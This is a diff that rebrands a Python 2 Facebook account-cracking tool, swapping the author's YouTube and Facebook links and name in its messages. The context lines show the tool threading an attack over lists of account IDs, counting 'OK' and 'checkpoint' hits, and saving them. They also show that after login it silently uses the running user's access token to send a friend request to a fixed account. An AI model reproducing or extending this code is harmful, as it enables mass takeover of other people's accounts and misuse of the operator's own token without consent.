@@ -137,10 +137,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+            os.system('xdg-open https://youtu.be/4vAX_vwvt3U ')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+        os.system('xdg-open  https://youtu.be/4vAX_vwvt3U ')
 
 def login():
 	os.system('clear')
@@ -181,7 +181,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.facebook.com/ahtisham.sajid.Devil.prince302')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -446,7 +446,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank You♥️ \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed devil says Thank You♥️ \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
